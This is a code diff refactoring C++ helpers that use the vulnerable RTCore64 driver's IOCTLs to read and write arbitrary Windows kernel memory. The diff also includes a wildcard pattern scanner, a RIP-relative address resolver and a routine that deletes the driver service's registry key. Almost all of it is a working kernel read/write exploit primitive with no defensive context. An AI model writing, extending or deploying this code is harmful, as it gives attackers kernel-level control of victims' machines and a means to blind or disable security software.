@@ -45,11 +45,14 @@ uintptr_t helpers::GetProcAddress( void* hModule, const wchar_t* wAPIName )
 }
 
 
-bool helpers::find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress ){
-    for ( size_t i = 0; i < scanSize - patternSize; i++ ) {
-        bool match = true;
-        for ( size_t j = 0; j < patternSize; j++ ) {
+bool helpers::find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress ) {
+    if ( !base || !pattern || patternSize == 0 || scanSize < patternSize ) return false;
 
+    size_t limit = scanSize - patternSize;
+    for ( size_t i = 0; i <= limit; ++i ) {
+        bool match{ true };
+
+        for ( size_t j = 0; j < patternSize; ++j ) {
             if ( j >= 9 && j <= 12 )
                 continue;
 
@@ -68,8 +71,8 @@ bool helpers::find_pattern( const uint8_t* base, size_t scanSize, const uint8_t*
     return false;
 }
 
-void helpers::DeleteService( PWCHAR ServiceName )
-{
+
+void helpers::DeleteService( PWCHAR ServiceName ){
     // TODO: drv side
     SHDeleteKeyW( HKEY_LOCAL_MACHINE, ServiceName + sizeof( NT_MACHINE ) / sizeof( WCHAR ) - 1 );
 }
@@ -81,61 +84,36 @@ uint64_t helpers::ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffse
 
 
 
-bool helpers::read_32( DWORD64 address, uint32_t& buffer ){
+bool helpers::read( DWORD64 address, uint32_t& buffer ){
     MemoryOperation operation{ 0 };
+    IO_STATUS_BLOCK IoStatusBlock{};
 
     operation.address = address;
     operation.size = sizeof( uint32_t );
     operation.data = buffer;
+    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
 
-    if ( !DeviceIoControl( helpers::dev, 0x80002048, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
+    if ( !DeviceIoControl( helpers::dev, RTCORE64_MEMORY_READ_CODE, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
         return false;
 
     buffer = static_cast< uint32_t >( operation.data );
     return true;
 }
 
-bool helpers::write_32( DWORD64 address, uint32_t value )
-{
-    MemoryOperation operation{ 0 };
-    operation.address = address;
-    operation.size = sizeof( 2 );
-    operation.data = value;
 
-    if ( !DeviceIoControl( helpers::dev, 0x8000204C, &operation, sizeof( operation ), &operation, sizeof( operation ), NULL, NULL ) )
-        return false;
-
-    return true;
-}
-
-bool helpers::read_64( DWORD64 address, DWORD64& buffer ){
+bool helpers::read_64( DWORD64 address, DWORD64& buffer ) {
     uint32_t low{ 0 };
     uint32_t high{ 0 };
 
-    if ( !helpers::read_32( address, low ) ) return false;
+    if ( !helpers::read( address, low ) ) return false;
 
-    if ( !helpers::read_32( address + 4, high ) ) return false;
+    if ( !helpers::read( address + 4, high ) ) return false;
 
-    buffer = ( static_cast< DWORD64 >( high ) << 32 ) | low; 
+    buffer = ( static_cast< DWORD64 >( high ) << 32 ) | low;
         return true;
 }
 
-bool helpers::write_64( DWORD64 address, DWORD64 value ){
-    uint32_t low = value & 0xFFFFFFFF;
-    uint32_t high =  value >> 32;
-
-    if ( !helpers::write_32( address, low ) )
-        return false;
-
-    if ( !helpers::write_32( address + 4, high ) )
-        return false;
-
-    return true;
-}
-
-
-
-NTSTATUS test::WriteMemoryPrimitive( HANDLE Device, DWORD64 Address, DWORD Value ) {
+NTSTATUS helpers::write( DWORD64 Address, DWORD Value ) {
     helpers::MemoryOperation MemoryRead{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
@@ -147,14 +125,21 @@ NTSTATUS test::WriteMemoryPrimitive( HANDLE Device, DWORD64 Address, DWORD Value
 
     DWORD BytesReturned{ 0 };
 
-    return DeviceIoControl( Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof( MemoryRead ), 
+    return DeviceIoControl( helpers::dev, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof( MemoryRead ),
        &MemoryRead, sizeof( MemoryRead ), &BytesReturned, nullptr );
 }
 
-NTSTATUS test::WriteMemoryDWORD64( HANDLE Device, DWORD64 Address, DWORD64 Value ){
-    test::WriteMemoryPrimitive( Device, Address, Value & 0xffffffff );
-    test::WriteMemoryPrimitive( Device, Address + 4, Value >> 32 );
-    return STATUS_SUCCESS;
+bool helpers::write_64( DWORD64 address, DWORD64 value ) {
+    uint32_t low = value & 0xFFFFFFFF;
+    uint32_t high = value >> 32;
+
+    if ( !helpers::write( address, low ) )
+        return false;
+
+    if ( !helpers::write( address + 4, high ) )
+        return false;
+
+    return true;
 }
 
 
